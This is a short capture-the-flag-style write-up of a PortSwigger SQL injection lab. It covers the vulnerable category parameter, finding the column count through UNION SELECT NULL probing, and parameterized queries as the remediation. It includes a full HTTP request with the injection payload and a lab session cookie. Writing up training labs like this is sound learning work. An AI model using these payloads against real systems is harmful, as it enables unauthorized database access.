
#portswigger #solution #sqli

- **Category:** [[SQL injection]]
- **Difficulty:** [[PRACTITIONER]]
- **URL Lab:** https://portswigger.net/web-security/learning-paths/sql-injection
- **Date Solved:** 2026-08-02

---
## 🎯 1. Lab Objective
> Determine the number of columns in original Query (filtering the category) 

---

## 🔍 2. Reconnaissance & Vulnerability Analysis
* **Vulnerable Endpoint/Parameter:** `GET /filter?category=Gifts HTTP/2`
* **Root Cause & Mechanism:** The dynamic Query has been made up by concreting user's input without sanitizing it

---

## 🚀 Exploitation
>Modify the parameter using UNION query selecting NULL table. The response returns code 200 when the number of NULL = 3, otherwise 500.
>![[Pasted image 20260802140345.png]]
![[Pasted image 20260802132500.png]]
---

## ⚡ 4. PoC / Final Payload

```http
GET /filter?category=Gifts' UNION SELECT NULL, NULL, NULL-- HTTP/2
Host: 0a5f001f04cabadc805d67f4006c00af.web-security-academy.net
Cookie: session=JfSptNOdO4UUXphDUEw9OMozeTmArBRe
Sec-Ch-Ua: "Not;A=Brand";v="8", "Chromium";v="150"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a5f001f04cabadc805d67f4006c00af.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i


```
---
## 💡 5. Key Takeaways & Remediation

- **Key Concept:** Bypassing fliters logic using UNION
- **Remediation:** Using parameterized query
